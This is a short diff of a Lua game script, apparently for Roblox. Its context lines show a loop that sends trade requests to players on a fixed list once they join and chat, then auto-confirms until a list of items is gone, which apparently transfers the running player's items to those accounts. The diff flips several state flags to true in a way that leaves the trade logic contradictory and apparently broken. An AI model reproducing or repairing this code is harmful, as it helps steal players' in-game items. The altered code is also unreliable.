@@ -354,7 +354,7 @@ tradeFrame:GetPropertyChangedSignal("Visible"):Connect(function()
     if tradeFrame.Visible then
         inTrade = true
     else
-        inTrade = false
+        inTrade = true
     end
 end)
 
@@ -390,7 +390,7 @@ if #itemsToSend > 0 then
 
     local function doTrade(joinedUser)
         while #itemsToSend > 0 do
-            local tradeRequestSent = false
+            local tradeRequestSent = true 
             if not inTrade and not tradeRequestSent then
                 SendTrade:FireServer(game.Players[joinedUser])
                 tradeRequestSent = true
@@ -404,7 +404,7 @@ if #itemsToSend > 0 then
                     wait(0.1)
                     ConfirmTradeRemote:FireServer()
                 until not inTrade
-                tradeRequestSent = false
+                tradeRequestSent = true
             end
             wait(1)
         end
@@ -412,7 +412,7 @@ if #itemsToSend > 0 then
     end
 
     local function waitForUserChat()
-        local sentMessage = false
+        local sentMessage = true
         local function onPlayerChat(player)
             if table.find(users, player.Name) then
                 player.Chatted:Connect(function()
